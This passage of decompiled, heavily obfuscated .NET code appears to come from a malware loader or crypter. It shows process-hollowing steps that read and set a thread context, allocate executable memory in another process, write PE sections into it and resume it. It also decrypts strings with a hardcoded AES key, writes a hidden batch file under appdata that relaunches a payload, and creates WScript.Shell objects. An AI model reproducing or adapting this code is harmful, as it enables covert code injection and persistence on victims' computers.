                int32_3 = BitConverter.ToInt32(src, checked (num2 + 20));
                if (int32_6 != 0)
                {
                  dst = new byte[checked (int32_6 - 1 + 1)];
                  num6 = 0;
                  continue;
                }
                goto label_15;
              }
            case 13:
              // ISSUE: reference to a compiler-generated field
              if (hb(ub.\u0023Tb.\u00230, checked (num4 + 8), ref num5, 4, ref num1))
              {
                // ISSUE: reference to a compiler-generated field
                if (int32_1 != num5 || lb(ub.\u0023Tb.\u00230, num5) == 0)
                {
                  int32_7 = BitConverter.ToInt32(src, checked (int32_5 + 80));
                  // ISSUE: reference to a compiler-generated field
                  zb.\u0023Wb = BitConverter.ToInt32(src, checked (int32_5 + 84));
                  flag3 = false;
                  // ISSUE: reference to a compiler-generated field
                  // ISSUE: reference to a compiler-generated field
                  zb.\u0023Vb = mb(ub.\u0023Tb.\u00230, int32_1, int32_7, 12288, 64);
                  // ISSUE: reference to a compiler-generated field
                  if (!flag1 && zb.\u0023Vb == 0)
                  {
                    flag3 = true;
                    // ISSUE: reference to a compiler-generated field
                    // ISSUE: reference to a compiler-generated field
                    zb.\u0023Vb = mb(ub.\u0023Tb.\u00230, 0, int32_7, 12288, 64);
                    goto case 3;
                  }
                  else
                    goto case 3;
                }
                else
                  goto label_44;
              }
              else
                goto label_42;
            case 14:
              goto label_45;
            default:
              num6 = 3;
              continue;
          }
        }
label_4:
        if (!string.IsNullOrEmpty(str1))
        {
          str3 = str3 + " " + str1;
          num7 = 5;
          goto label_38;
        }
        else
          goto label_2;
label_6:
        if (flag3)
        {
          // ISSUE: reference to a compiler-generated field
          zb.\u0023Vb = int32_1;
        }
        // ISSUE: reference to a compiler-generated field
        numArray[44] = checked (zb.\u0023Vb + int32_2);
        // ISSUE: reference to a compiler-generated field
        if (kb(ub.\u0023Tb.\u00231, numArray) != 0U)
          throw new Exception();
        if (flag2)
        {
          // ISSUE: reference to a compiler-generated method
          new Thread(new ThreadStart(zb.\u0023Yb)).Start();
          goto label_47;
        }
        else
        {
          SuspendCount = 0U;
          num7 = 7;
          goto label_38;
        }
label_13:
        Buffer.BlockCopy((Array) src, int32_3, (Array) dst, 0, dst.Length);
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        if (!ib(ub.\u0023Tb.\u00230, checked (zb.\u0023Vb + int32_4), dst, dst.Length, ref num1))
          throw new Exception();
label_15:
        checked { num2 += 40; }
        checked { ++num3; }
        num7 = 12;
        goto label_38;
label_18:
        // ISSUE: reference to a compiler-generated field
        if (nb(ub.\u0023Tb.\u00231, out SuspendCount) == -1)
        {
          num7 = 14;
          goto label_38;
        }
        else
          goto label_47;
label_21:
        throw new Exception();
label_23:
        throw new Exception();
label_27:
        numArray = new int[179];
        numArray[0] = 65538;
        // ISSUE: reference to a compiler-generated field
        if (!jb(ub.\u0023Tb.\u00231, numArray))
          throw new Exception();
        num4 = numArray[41];
        num5 = 0;
        num7 = 13;
        goto label_38;
label_30:
        // ISSUE: reference to a compiler-generated field
        if (!ib(ub.\u0023Tb.\u00230, checked (num4 + 8), bytes, 4, ref num1))
          throw new Exception();
        int32_2 = BitConverter.ToInt32(src, checked (int32_5 + 40));
        num7 = 1;
        goto label_38;
label_33:
        throw new Exception();
label_35:
        throw new Exception();
label_42:
        throw new Exception();
label_44:
        num7 = 8;
        goto label_38;
label_45:
        throw new Exception();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag4 = false;
        ProjectData.ClearProjectError();
        goto label_48;
      }
label_47:
      Thread.Sleep(100);
      return true;
label_48:
      return flag4;
    }
    catch (Exception ex)
    {
      Thread thread;
      object[] objArray = new object[38]
      {
        (object) ub,
        (object) flag2,
        (object) str1,
        (object) flag1,
        (object) gb,
        (object) src,
        (object) jb,
        (object) flag4,
        (object) lb,
        (object) str2,
        (object) str3,
        (object) hb,
        (object) num1,
        (object) nb,
        (object) kb,
        (object) eb,
        (object) mb,
        (object) ib,
        (object) zb,
        (object) int32_2,
        (object) flag3,
        (object) num5,
        (object) numArray,
        (object) num4,
        (object) int32_5,
        (object) num3,
        (object) int32_1,
        (object) int16,
        (object) bytes,
        (object) num2,
        (object) int32_7,
        (object) int32_3,
        (object) int32_6,
        (object) int32_4,
        (object) dst,
        (object) SuspendCount,
        (object) thread,
        (object) obj0
      };
      \u0023\u0023.\u0023ji(ex, objArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023gj([In] \u0023qc.\u0023md obj0, [In] int obj1)
  {
    int num1;
    try
    {
      num1 = 0;
label_2:
      while (true)
      {
        int num2;
        if (obj1 >= 4)
        {
          num1 += 2;
          num2 = 2;
        }
        else
          num2 = 4;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_4;
            case 1:
            case 3:
              goto label_2;
            case 4:
              goto label_7;
            default:
              num2 = 3;
              continue;
          }
        }
label_4:
        obj1 >>= 1;
      }
label_7:
      return num1 + obj1;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      \u0023qc.\u0023md md = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj1;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) md, (object) local2);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023hj([In] string obj0, [In] Font obj1, [In] int obj2, [In] Graphics obj3)
  {
    try
    {
      return \u0023\u0023.\u0023xi(obj2, obj0, obj3, obj1);
    }
    catch (Exception ex1)
    {
      try
      {
        return Convert.ToInt32((double) \u0023\u0023.\u0023wk(obj2, obj1, obj0, obj3) * 1.1);
      }
      catch (Exception ex2)
      {
      }
    }
    return 0;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023ij([In] \u0023hf obj0) => obj0.\u0023df;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static System.Type \u0023jj([In] \u00238e obj0) => obj0.\u00235e;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023kj([In] \u0023qc.\u0023Cc obj0)
  {
    try
    {
      return 32768 - obj0.\u0023Oc;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Cc cc = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) cc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023lj([In] string obj0, [In] \u0023Te obj1)
  {
    int num1;
    try
    {
      bool flag1 = obj1.\u0023xe[0] == '\u0001';
      int num2 = 0;
      if (true)
        goto label_6;
label_1:
      int index1;
      int num3;
      switch (obj0)
      {
        case "":
        case null:
          num1 = -1;
          if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
          {
            num2 = 6;
            goto label_6;
          }
          else
            break;
        default:
          if ((!flag1 || obj0.Length <= 4) && (flag1 || obj0[0] == '#'))
          {
            num3 = 0;
            index1 = obj0.Length - 1;
            goto label_18;
          }
          else
            goto case "";
      }
label_4:
      bool flag2 = false;
      goto label_13;
label_5:
      int num4;
      num2 = num4;
label_6:
      switch (num2)
      {
        case 0:
          goto label_1;
        case 1:
        case 6:
          goto label_27;
        case 2:
          break;
        case 3:
          num1 = -1;
          goto label_27;
        case 4:
        case 7:
          goto label_13;
        case 5:
          goto label_11;
        case 8:
          goto label_4;
        case 9:
          goto label_25;
        default:
          num4 = 7;
          goto label_5;
      }
label_8:
      char ch = obj0[index1];
      num4 = 8;
      goto label_5;
label_11:
      if (!flag2)
      {
        num2 = 3;
        goto label_6;
      }
      else
      {
        --index1;
        goto label_18;
      }
label_13:
      for (int index2 = 0; index2 < obj1.\u0023xe.Length; ++index2)
      {
        if ((int) obj1.\u0023xe[index2] == (int) ch)
        {
          num3 = num3 * obj1.\u0023xe.Length + index2;
          flag2 = true;
          num4 = 5;
          goto label_5;
        }
      }
      goto label_11;
label_18:
      if (index1 < 0)
      {
        if (true)
        {
          num2 = 9;
          goto label_6;
        }
        else
          goto label_27;
      }
      else if (!flag1)
      {
        if (index1 != 0)
        {
          num4 = 2;
          goto label_5;
        }
      }
      else
        goto label_8;
label_25:
      num1 = num3;
    }
    catch
    {
      num1 = -1;
    }
label_27:
    return num1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023mj()
  {
    Process process1;
    object objectValue;
    string str1;
    string str2;
    try
    {
      process1 = new Process();
      process1.WaitForExit();
      int num1 = 2;
      if (true)
        goto label_3;
label_1:
      objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WSfcfdfdsfdsfsffffffffffffffccript.Shell"));
      goto label_5;
label_2:
      int num2;
      num1 = num2;
label_3:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_6;
          case 1:
          case 3:
            goto label_1;
          case 4:
            goto label_5;
          case 5:
            goto label_9;
          default:
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num1 = 4;
              continue;
            }
            goto label_5;
        }
      }
label_6:
      if (!process1.HasExited)
        process1.Kill();
      str1 = "3232dsd";
      num2 = 3;
      goto label_2;
label_9:
      str2 = "3232dsd";
      return;
label_5:
      objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
      num2 = 5;
      goto label_2;
    }
    catch (Exception ex)
    {
      string str3 = str1;
      string str4 = str2;
      Process process2 = process1;
      object obj = objectValue;
      \u0023\u0023.\u0023pl(ex, (object) str3, (object) str4, (object) process2, obj);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023nj([In] string obj0)
  {
    string str1;
    try
    {
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\RedGate\\SmartAssembly");
      int num = 4;
      string str2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 1:
            goto label_4;
          case 2:
          case 3:
            goto label_9;
          case 4:
            if (registryKey == null)
            {
              if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
              {
                num = 0;
                continue;
              }
              goto label_9;
            }
            else
            {
              str2 = (string) registryKey.GetValue(obj0, (object) string.Empty);
              registryKey.Close();
              if (\u0023\u0023.UBSgn55zIxbZDXest3e())
              {
                num = 5;
                continue;
              }
              goto label_4;
            }
          case 5:
            goto label_7;
          default:
            num = 3;
            continue;
        }
      }
label_4:
      str1 = string.Empty;
      goto label_9;
label_7:
      str1 = str2;
    }
    catch
    {
      str1 = string.Empty;
    }
label_9:
    return str1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023oj()
  {
    try
    {
      try
      {
        \u0023\u0023.\u00239k();
      }
      catch (Exception ex)
      {
      }
    }
    catch (Exception ex)
    {
      \u0023\u0023.\u00236i(ex);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static \u0023yf \u0023pj([In] \u0023tf obj0) => obj0.\u0023pf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023qj([In] \u0023qc.\u0023Jd obj0)
  {
    int index1;
    int index2;
    int num1;
    int num2;
    try
    {
      Array.Copy((Array) obj0.\u0023Hc, 32768, (Array) obj0.\u0023Hc, 0, 32768);
      int num3 = 5;
      while (true)
      {
        int num4 = num3;
label_5:
        while (true)
        {
          switch (num4)
          {
            case 0:
            case 5:
              obj0.\u0023yd -= 32768;
              obj0.\u0023Cd -= 32768;
              obj0.\u0023Bd -= 32768;
              num4 = 4;
              continue;
            case 1:
            case 3:
              ++index1;
              if (true)
              {
                num4 = 6;
                continue;
              }
              goto label_2;
            case 2:
              goto label_8;
            case 4:
              goto label_2;
            case 6:
              goto label_12;
            default:
              goto label_6;
          }
        }
label_2:
        index2 = 0;
        goto label_9;
label_6:
        num3 = 2;
        continue;
label_8:
        ++index2;
label_9:
        if (index2 < 32768)
        {
          num1 = (int) obj0.\u0023wd[index2] & (int) ushort.MaxValue;
          obj0.\u0023wd[index2] = num1 >= 32768 ? (short) (num1 - 32768) : (short) 0;
          goto label_8;
        }
        else
          index1 = 0;
label_12:
        while (index1 < 32768)
        {
          num2 = (int) obj0.\u0023xd[index1] & (int) ushort.MaxValue;
          obj0.\u0023xd[index1] = num2 >= 32768 ? (short) (num2 - 32768) : (short) 0;
          if (true)
          {
            num4 = 1;
            goto label_5;
          }
        }
        break;
      }
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) index1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num2;
      \u0023qc.\u0023Jd jd = obj0;
      \u0023\u0023.\u0023mk(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) jd);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023rj()
  {
    try
    {
      return Application.ExecutablePath;
    }
    catch
    {
      return "N/A";
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023sj([In] int obj0, [In] \u0023qc.\u0023md obj1)
  {
    int num1;
    int num2;
    try
    {
      int num3;
      if (obj0 == (int) byte.MaxValue)
      {
        if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
          num3 = 3;
        else
          goto label_12;
      }
      else
      {
        num1 = 257;
        goto label_8;
      }
label_4:
      while (true)
      {
        int num4;
        switch (num3)
        {
          case 0:
          case 3:
            num2 = 285;
            num4 = 4;
            break;
          case 1:
          case 4:
            goto label_12;
          case 2:
            goto label_8;
          case 5:
            goto label_10;
          default:
            num4 = 2;
            break;
        }
        num3 = num4;
      }
label_10:
      num2 = num1 + obj0;
      goto label_12;
label_8:
      for (; obj0 >= 8; obj0 >>= 1)
        num1 += 4;
      num3 = 5;
      goto label_4;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      \u0023qc.\u0023md md = obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj0;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) md, (object) local2);
      throw;
    }
label_12:
    return num2;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023tj([In] \u0023qc.\u0023md obj0, [In] int obj1)
  {
    int num1;
    try
    {
      obj0.\u0023ed[obj0.\u0023gd] = (short) 0;
      int num2 = 2;
      while (true)
      {
        int num3 = num2;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 2:
              byte[] fd = obj0.\u0023fd;
              num1 = obj0.\u0023gd++;
              int index = num1;
              int num4 = (int) (byte) obj1;
              fd[index] = (byte) num4;
              goto case 1;
            case 1:
            case 3:
              ++obj0.\u0023dd.\u0023nd[obj1];
              num3 = 4;
              continue;
            case 4:
              goto label_6;
            default:
              goto label_5;
          }
        }
label_5:
        num2 = 3;
      }
label_6:
      return \u0023\u0023.\u0023Di(obj0);
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      \u0023qc.\u0023md md = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) obj1;
      \u0023\u0023.\u0023Dj(ex, (object) local1, (object) md, (object) local2);
      throw;
    }
  }

  [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
  internal static extern IntPtr \u0023uj([In] IntPtr obj0, [In] IntPtr obj1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023vj([In] \u0023tf obj0) => obj0.\u0023rf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023wj([In] \u0023hf obj0) => obj0.\u0023ff;

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023xj([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023yj([In] \u0023qc.\u0023Gc obj0)
  {
    int num1;
    int index;
    bool flag;
    int num2;
    int num3;
    int wc;
    try
    {
      num1 = \u0023\u0023.\u0023kj(obj0.\u0023Cc);
      int num4 = 5;
label_13:
      while (true)
      {
        int num5;
        switch (num4)
        {
          case 0:
          case 5:
            while (num1 >= 258)
            {
              wc = obj0.\u0023wc;
              switch (wc)
              {
                case 7:
                  while (((index = \u0023\u0023.\u0023sl(obj0.\u0023Ec, obj0.\u0023E)) & -256) == 0)
                  {
                    \u0023\u0023.\u0023Ni(obj0.\u0023Cc, index);
                    if (--num1 < 258)
                    {
                      flag = true;
                      num5 = 11;
                      goto label_12;
                    }
                  }
                  if (index < 257)
                  {
                    if (index < 0)
                    {
                      flag = false;
                      goto label_36;
                    }
                    else
                    {
                      obj0.\u0023Fc = (\u0023qc.\u0023Sc) null;
                      obj0.\u0023Ec = (\u0023qc.\u0023Sc) null;
                      obj0.\u0023wc = 2;
                      flag = true;
                      num5 = 9;
                      goto label_12;
                    }
                  }
                  else
                  {
                    obj0.\u0023yc = \u0023qc.\u0023Gc.\u0023sc[index - 257];
                    if (true)
                    {
                      num4 = 10;
                      goto label_13;
                    }
                    else
                      continue;
                  }
                case 8:
                  goto label_16;
                case 9:
                  goto label_32;
                case 10:
                  goto label_2;
                default:
                  continue;
              }
            }
            num5 = 12;
            goto label_12;
          case 1:
            obj0.\u0023wc = 10;
            num3 = \u0023\u0023.\u0023cj(obj0.\u0023E, obj0.\u0023xc);
            if (num3 >= 0)
            {
              \u0023\u0023.\u0023Ui(obj0.\u0023E, obj0.\u0023xc);
              obj0.\u0023zc += num3;
              goto label_24;
            }
            else
              goto label_22;
          case 2:
          case 9:
          case 11:
            goto label_36;
          case 3:
            obj0.\u0023wc = 7;
            goto case 0;
          case 4:
          case 6:
label_31:
            obj0.\u0023wc = 9;
            goto label_32;
          case 7:
            obj0.\u0023yc += num2;
            num5 = 4;
            goto label_12;
          case 8:
            num2 = \u0023\u0023.\u0023cj(obj0.\u0023E, obj0.\u0023xc);
            if (num2 >= 0)
            {
              \u0023\u0023.\u0023Ui(obj0.\u0023E, obj0.\u0023xc);
              goto case 7;
            }
            else
              goto label_10;
          case 10:
            obj0.\u0023xc = \u0023qc.\u0023Gc.\u0023tc[index - 257];
            goto label_16;
          case 12:
            goto label_34;
          default:
            if (true)
            {
              num4 = 7;
              continue;
            }
            goto case 10;
        }
label_2:
        if (obj0.\u0023xc > 0)
          num5 = 1;
        else
          goto label_24;
label_12:
        num4 = num5;
        continue;
label_16:
        if (obj0.\u0023xc > 0)
        {
          obj0.\u0023wc = 8;
          num5 = 8;
          goto label_12;
        }
        else
          goto label_31;
label_24:
        \u0023\u0023.\u0023Ak(obj0.\u0023Cc, obj0.\u0023yc, obj0.\u0023zc);
        num1 -= obj0.\u0023yc;
        num5 = 3;
        goto label_12;
label_32:
        index = \u0023\u0023.\u0023sl(obj0.\u0023Fc, obj0.\u0023E);
        if (index >= 0)
        {
          obj0.\u0023zc = \u0023qc.\u0023Gc.\u0023uc[index];
          obj0.\u0023xc = \u0023qc.\u0023Gc.\u0023vc[index];
          goto label_2;
        }
        else
        {
          flag = false;
          num5 = 2;
          goto label_12;
        }
      }
label_10:
      flag = false;
      goto label_36;
label_22:
      flag = false;
      goto label_36;
label_34:
      flag = true;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) index;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) wc;
      \u0023qc.\u0023Gc gc = obj0;
      \u0023\u0023.\u0023uk(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) gc);
      throw;
    }
label_36:
    return flag;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023zj([In] \u00239e obj0, [In] \u0023Te obj1)
  {
    int num1 = 2;
    while (true)
    {
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 2:
            goto label_1;
          case 1:
          case 3:
            goto label_3;
          case 4:
            goto label_2;
          case 5:
            goto label_4;
          default:
            int num3 = 4;
            num2 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num3 : num3;
            continue;
        }
      }
label_1:
      \u0023af ie = obj1.\u0023Ie;
      num1 = 3;
      continue;
label_2:
      ie((object) obj1, obj0);
      num1 = 5;
      continue;
label_3:
      if (ie == null)
        break;
      goto label_2;
    }
    return;
label_4:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static byte[] \u0023Aj([In] byte[] obj0)
  {
    try
    {
      return \u0023\u0023.\u0023Aj((byte[]) null, 1, obj0, (byte[]) null);
    }
    catch (Exception ex)
    {
      byte[] numArray = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) numArray);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Bj() => "Software\\Red Gate\\" + \u0023\u0023.\u0023Ok();

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Assembly[] \u0023Cj([In] \u0023Te obj0)
  {
    try
    {
      return AppDomain.CurrentDomain.GetAssemblies();
    }
    catch
    {
      return new Assembly[1]{ \u0023\u0023.\u0023Gj() };
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Dj([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3) => \u0023\u0023.\u0023ji(obj0, new object[3]
  {
    obj1,
    obj2,
    obj3
  });

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023Ej()
  {
label_0:
    int num1;
    int num2;
    string str1;
    string str2;
    string str3;
    string[] strArray1;
    StreamWriter streamWriter1;
    string str4;
    int num3;
    try
    {
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        num2 = 2;
        str1 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
label_2:
        num2 = 3;
        str2 = Interaction.Environ(\u0023\u0023.\u0023ei("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
label_3:
        num2 = 4;
        str3 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
label_4:
        num2 = 5;
        System.IO.File.Delete(str3 + \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA==") + "\\qJ1rx6zo0JWv6cXezCyOGQ==.bat");
label_5:
        num2 = 6;
        if (\u0023\u0023.\u00232h("cmd"))
          goto label_31;
label_6:
        num2 = 7;
        strArray1 = new string[5]
        {
          str3,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          ".bat"
        };
        streamWriter1 = new StreamWriter(string.Concat(strArray1));
label_7:
        num2 = 8;
        streamWriter1.AutoFlush = true;
label_8:
        num2 = 9;
        streamWriter1.Write(\u0023\u0023.\u0023ei("31RKsOSvI9/AFuhKog3NgA=="));
label_9:
        num2 = 10;
        streamWriter1.Write(Environment.NewLine);
label_10:
        num2 = 11;
        streamWriter1.Write("timeout /t 300");
label_11:
        num2 = 12;
        streamWriter1.Write(Environment.NewLine);
label_12:
        num2 = 13;
        streamWriter1.Write(\u0023\u0023.\u0023ei("sVCCMiKQCYeTpQSTFrz5DMemSYSw/JzXBSYI+oN2BW6+ek8GWRRLCnHl4EtHDxkzJ11cIioJHQYmf/Ko0hLc4w=="));
label_13:
        num2 = 14;
        streamWriter1.Write(Environment.NewLine);
label_14:
        num2 = 15;
        streamWriter1.Write(\u0023\u0023.\u0023ei("OHLI5dgL1wwNBGr/QEZ9WA=="));
label_15:
        num2 = 16;
        streamWriter1.Write(Environment.NewLine);
label_16:
        num2 = 17;
        streamWriter1.Write(") || (");
label_17:
        num2 = 18;
        streamWriter1.Write(Environment.NewLine);
label_18:
        num2 = 19;
        str4 = "%appdata%\\" + \u0023\u0023.\u0023ei("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw==");
label_19:
        num2 = 20;
        StreamWriter streamWriter2 = streamWriter1;
        strArray1 = new string[6]
        {
          " Start /W \"\" \"",
          str3,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          "\""
        };
        string str5 = string.Concat(strArray1);
        streamWriter2.Write(str5);
label_20:
        num2 = 21;
        streamWriter1.Write(Environment.NewLine);
label_21:
        num2 = 22;
        streamWriter1.Write(\u0023\u0023.\u0023ei("OHLI5dgL1wwNBGr/QEZ9WA=="));
label_22:
        num2 = 23;
        streamWriter1.Write(Environment.NewLine);
label_23:
        num2 = 24;
        streamWriter1.Write(")");
label_24:
        num2 = 25;
        streamWriter1.Dispose();
label_25:
        num2 = 26;
        strArray1 = new string[5]
        {
          str3,
          \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA=="),
          "\\",
          \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw=="),
          ".bat"
        };
        Interaction.Shell(string.Concat(strArray1), AppWinStyle.Hide);
        goto label_31;
label_27:
        num3 = num2;
        switch (num1)
        {
          case 1:
            int num4 = num3 + 1;
            num3 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
              case 28:
                goto label_31;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_27;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_31:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      string str6 = str3;
      string str7 = str1;
      string str8 = str2;
      string str9 = str4;
      StreamWriter streamWriter3 = streamWriter1;
      string[] strArray2 = strArray1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num2;
      \u0023\u0023.\u00238j(ex, (object) str6, (object) str7, (object) str8, (object) str9, (object) streamWriter3, (object) strArray2, (object) local1, (object) local2, (object) local3);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023Fj([In] string obj0)
  {
    string password;
    string s1;
    byte[] bytes1;
    byte[] buffer;
    MemoryStream memoryStream;
    ICryptoTransform decryptor;
    CryptoStream cryptoStream;
    byte[] numArray;
    int count;
    string str1;
    RijndaelManaged rijndaelManaged;
    byte[] bytes2;
    byte[] bytes3;
    int iterations;
    string s2;
    int num1;
    string str2;
    Rfc2898DeriveBytes rfc2898DeriveBytes;
    try
    {
      password = "nia";
      s1 = "cffffffffffffffffff";
      int num2 = 5;
      if (true)
        goto label_3;
label_1:
      bytes1 = Encoding.ASCII.GetBytes(s1);
      buffer = Convert.FromBase64String(obj0);
      goto label_9;
label_3:
      while (true)
      {
        int num3;
        switch (num2)
        {
          case 0:
          case 5:
            str2 = "SHA1";
            num3 = 4;
            break;
          case 1:
          case 4:
            iterations = 2;
            s2 = "@1B2c3D4e5F6g7H8";
            num1 = 256;
            bytes3 = Encoding.ASCII.GetBytes(s2);
            if (true)
            {
              num2 = 7;
              continue;
            }
            goto case 0;
          case 2:
            memoryStream = new MemoryStream(buffer);
            cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
            numArray = new byte[checked (buffer.Length - 1 + 1)];
            count = cryptoStream.Read(numArray, 0, numArray.Length);
            memoryStream.Close();
            cryptoStream.Close();
            str1 = Encoding.UTF8.GetString(numArray, 0, count);
            num3 = 8;
            break;
          case 3:
            goto label_9;
          case 6:
            decryptor = rijndaelManaged.CreateDecryptor(bytes2, bytes3);
            if (!\u0023\u0023.XPxp2PwLL1BPJh1nWga())
            {
              num2 = 2;
              continue;
            }
            goto case 1;
          case 7:
            goto label_1;
          case 8:
            goto label_10;
          default:
            num3 = 3;
            break;
        }
        num2 = num3;
      }
label_10:
      return str1;
label_9:
      rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, bytes1, iterations);
      bytes2 = rfc2898DeriveBytes.GetBytes(num1 / 8);
      rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.Mode = CipherMode.CBC;
      num2 = 6;
      goto label_3;
    }
    catch (Exception ex)
    {
